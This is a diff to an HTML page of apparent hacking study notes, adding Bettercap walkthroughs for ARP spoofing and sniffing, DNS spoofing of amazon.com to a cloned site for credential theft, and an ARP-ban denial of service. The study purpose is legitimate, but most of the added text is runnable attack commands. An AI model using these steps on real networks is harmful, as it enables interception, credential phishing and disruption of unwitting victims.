@@ -173,6 +173,56 @@
     <ul>Using arpspoof, we assigned the MAC address of the host system (IP C) to the target system (IP B) and access point (IP A)</ul>
   </ol></p>
 
-                <h2>Practice with Bettercap</h2>
+                <h2>Practice ARP spoof with Bettercap</h2>
                 <p><a target=_blank href=https://www.bettercap.org/>Bettercap</a>, better than Ettercap!</p>
                 <p><a target=_blank href=https://youtube.com/watch?v=xrK6KA9yzQE>Awesome video</a></p>
+                <p>The command arp -a shows all devices in the ARP table; the ones with "Type: dynamic" are interesting (only Windows will show this, Linux not). 
+                    The ones with "Type: static" can't be spoofed!</p>
+                <p><ol>
+                    <ul>Kali machine: start terminal</ul>
+                    <ul><i>sudo apt-get install bettercap</i></ul>
+                    <ul><i>sudo bettercap</i></ul>
+                    <ul>When Bettercap has started, see all nodes in the network:</ul>
+                    <ul><i>net.probe on</i></ul>
+                    <ul>If you query the ARP table again, you can see it is now filled with details of all devices in the network</ul>
+                    <ul>arp -a</ul>
+                    <ul>To show all devices: <i>net.show</i></ul>
+                    <ul>For the spoofing process, first type <i>help spoof</i></ul>
+                    <ul>We need: <b>arp.spoof.fullduplex</b> (If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)</ul>
+                    <ul><i>set arp.spoof.fullduplex true</i></ul>
+                    <ul><i>set arp.spoof.targets [IP gateway],[IP target]</i></ul>
+                    <ul>Now, everything is set up for the attack</ul>
+                    <ul><i>arp.spoof on</i></ul>
+                    <ul>In order to see details we can use:</ul>
+                    <ul><i>net.sniff on</i></ul>
+                    <ul>Bettercap starts to monitor the whole network</ul>
+                    <ul>Now, if the user of the victim's computer visits a HTTP webpage, it shows up in the terminal</ul>
+                    <ul>This is because the data flows THROUGH the Kali computer (a real MITM attack)</ul>
+                    <ul>It will NOT work if the victim uses a proxy tunnel (like NordVPN) to visit internet or if he visits HTTPS webpages</ul>
+                    <ul>So, the scope of this attack is limited but interesting</ul>
+                </ol></p>
+
+                <h2>Practice DNS spoof with Bettercap</h2>
+                <p>We want to spoof a domain, build a clone website on own server and trick victim to visit our server instead of the real domain</p>
+                <p><ol>
+                    <ul><i>help dns.spoof</i></ul>
+                    <ul>Start nginx on Kali system en create website in /var/www/html</ul>
+                    <ul><i>service nginx start</i></ul>
+                    <ul><i>set dns.spoof.domains amazon.com</i></ul>
+                    <ul><i>set dns.spoof.address [IP Kali system]</i></ul>
+                    <ul><i>dns.spoof on</i></ul>
+                    <ul>Now, when te victim visits amazon.com he is directed to our webpages</ul>
+                    <ul>Here, we can trick the victim to log in and gives us the credentials etc.</ul>
+                    <ul>It only works for the victim pc, so first we had to do these steps:</ul>
+                    <ul><i>set arp.spoof.fullduplex true</i></ul>
+                    <ul><i>set arp.spoof.targets [IP gateway],[IP target]</i></ul>
+                    <ul>Don't forget to <i>dns.spoof off</i></ul>
+                </ol></p>
+
+                <h2>Practice DNS ban (DoS) with Bettercap</h2>
+                <p><ol>
+                    <ul><i>set arp.spoof.fullduplex true</i></ul>
+                    <ul><i>set arp.spoof.targets [IP gateway],[IP target]</i></ul>
+                    <ul><i>arp.ban on</i></ul>
+                    <ul>With this command we do a succesful DoS on the victim pc, if he wants to visit a website, it is not possible because of the ARP ban</ul>
+                </ol></p>
